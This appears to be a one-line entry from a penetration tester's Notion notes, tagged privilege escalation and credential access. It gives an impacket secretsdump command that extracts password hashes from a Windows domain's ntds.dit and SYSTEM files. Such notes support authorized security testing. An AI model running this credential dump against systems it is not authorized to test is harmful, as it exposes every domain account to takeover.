# secretsdump extract hashes ntds.dit

OS: Windows
Description: Secrets dump ntds.dit extract hashes
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21), Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21)

```jsx
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```